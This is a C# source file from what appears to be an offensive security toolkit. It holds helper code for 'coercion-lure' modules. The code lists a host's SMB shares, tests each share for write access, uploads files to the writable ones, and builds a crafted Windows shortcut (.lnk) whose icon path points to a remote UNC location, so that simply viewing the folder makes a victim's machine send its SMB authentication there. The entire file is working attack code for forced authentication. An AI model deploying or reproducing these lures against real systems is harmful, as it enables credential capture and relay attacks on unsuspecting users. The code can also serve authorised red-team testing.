using System.Text;
using Titanis;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Mswkst;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// Shared drop logic for coercion-lure modules (drop-sc, drop-library-ms, scuffy, slinky).
/// </summary>
internal static class SmbDropHelper
{
	public static async Task<List<string>> WritableSharesAsync(AtlasModuleContext<Smb2Client> ctx, HashSet<string> ignore, CancellationToken ct)
	{
		var result = new List<string>();
		RpcClient rpc = ctx.Services.CreateRpcClient();
		var srvs = new ServerServiceClient();
		await rpc.ConnectPipe(srvs, ctx.Client, new UncPath(ctx.Host, Smb2Client.IpcName, srvs.WellKnownPipeName ?? "srvsvc"), ct).ConfigureAwait(false);
		IList<ShareInfo> shares;
		try { shares = await srvs.GetShares(@"\\" + ctx.Host, ShareInfoLevel.Level1, ServerServiceClient.DefaultReturnBufferSize, ct).ConfigureAwait(false); }
		catch { shares = await srvs.GetShares(@"\\" + ctx.Host, ShareInfoLevel.Level0, ServerServiceClient.DefaultReturnBufferSize, ct).ConfigureAwait(false); }
		foreach (var share in shares)
		{
			if (share.ShareName.Equals("IPC$", StringComparison.OrdinalIgnoreCase)) continue;
			if (ignore.Contains(share.ShareName)) continue;
			if (await IsWritableAsync(ctx, share.ShareName, ct).ConfigureAwait(false))
				result.Add(share.ShareName);
		}
		return result;
	}

	private static async Task<bool> IsWritableAsync(AtlasModuleContext<Smb2Client> ctx, string share, CancellationToken ct)
	{
		string probe = $"__{Guid.NewGuid():N}.tmp";
		try
		{
			var create = new Smb2CreateInfo
			{
				CreateDisposition = Smb2CreateDisposition.Supersede,
				DesiredAccess = (uint)(Smb2FileAccessRights.GenericWrite | Smb2FileAccessRights.Delete),
				ShareAccess = Smb2ShareAccess.Read | Smb2ShareAccess.Write,
				FileAttributes = Titanis.Winterop.FileAttributes.Normal,
				ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
				CreateOptions = Smb2FileCreateOptions.NonDirectory | Smb2FileCreateOptions.SynchronousIoNonalert,
			};
			await using Smb2OpenFile f = (Smb2OpenFile)await ctx.Client.CreateFileAsync(new UncPath(ctx.Host, share, probe), create, FileAccess.Write, ct).ConfigureAwait(false);
			try { await ctx.Client.DeleteFileAsync(new UncPath(ctx.Host, share, probe), CancellationToken.None).ConfigureAwait(false); } catch { }
			return true;
		}
		catch { return false; }
	}

	public static async Task PutAsync(AtlasModuleContext<Smb2Client> ctx, string share, string name, byte[] content, CancellationToken ct)
	{
		var create = new Smb2CreateInfo
		{
			CreateDisposition = Smb2CreateDisposition.Supersede,
			DesiredAccess = (uint)Smb2FileAccessRights.GenericWrite,
			ShareAccess = Smb2ShareAccess.Read,
			FileAttributes = Titanis.Winterop.FileAttributes.Normal,
			ImpersonationLevel = Smb2ImpersonationLevel.Impersonation,
			CreateOptions = Smb2FileCreateOptions.NonDirectory | Smb2FileCreateOptions.SynchronousIoNonalert,
		};
		await using Smb2OpenFile remote = (Smb2OpenFile)await ctx.Client.CreateFileAsync(new UncPath(ctx.Host, share, name), create, FileAccess.Write, ct).ConfigureAwait(false);
		await using Stream rs = remote.GetStream(false);
		await rs.WriteAsync(content, ct).ConfigureAwait(false);
		await rs.FlushAsync(ct).ConfigureAwait(false);
	}

	public static byte[] BuildLnk(string iconUnc)
	{
		// Minimal MS-SHLLINK: header + empty IDList + IconLocation string (triggers SMB auth when rendered).
		using var ms = new MemoryStream();
		using var w = new BinaryWriter(ms, Encoding.Unicode);
		w.Write(76);
		w.Write(new Guid("00021401-0000-0000-c000-000000000046").ToByteArray());
		w.Write(0x41u); // HasLinkTargetIDList | HasIconLocation
		w.Write(0x20u); // FILE_ATTRIBUTE_ARCHIVE
		w.Write(0L); w.Write(0L); w.Write(0L); // times
		w.Write(0u); // FileSize
		w.Write(0); // IconIndex
		w.Write(1); // ShowCommand SW_SHOWNORMAL
		w.Write((ushort)0); w.Write((ushort)0); // HotKey, Reserved1
		w.Write(0u); w.Write(0u); // Reserved2/3
		w.Write((ushort)2); w.Write((ushort)0); // IDListSize=2, TerminalID
		w.Write((ushort)iconUnc.Length);
		w.Write(Encoding.Unicode.GetBytes(iconUnc));
		return ms.ToArray();
	}
}
